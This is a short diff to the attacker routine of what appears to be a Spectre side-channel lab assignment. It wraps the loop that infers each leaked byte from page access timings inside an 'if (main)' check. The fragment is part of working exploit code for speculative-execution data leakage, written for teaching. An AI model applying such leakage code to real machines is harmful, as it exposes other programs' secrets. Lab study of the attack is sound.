@@ -76,21 +76,23 @@ int run_attacker(char *shared_memory) {
 
         }
        // printf("==================== \n");
-        int max = 0;
-        int final_p = 0;
-        for (int p = 0; p < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; p++) {
-           // printf("access time %d \n", page_stats[p]);
-            if (page_stats[p] > max) {
-                max = page_stats[p];
-                leaked_byte = (char)p;
-            }
-        }
-        //leaked_byte = (char)page;
+       if (main) {
+           int max = 0;
+           int final_p = 0;
+           for (int p = 0; p < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; p++) {
+               // printf("access time %d \n", page_stats[p]);
+               if (page_stats[p] > max) {
+                   max = page_stats[p];
+                   leaked_byte = (char) p;
+               }
+           }
+           //leaked_byte = (char)page;
 
-        leaked_str[current_offset] = leaked_byte;
-        if (leaked_byte == '\x00') {
-            break;
-        }
+           leaked_str[current_offset] = leaked_byte;
+           if (leaked_byte == '\x00') {
+               break;
+           }
+       }
     }
 
     printf("\n\n[Part 2] We leaked:\n%s\n", leaked_str);
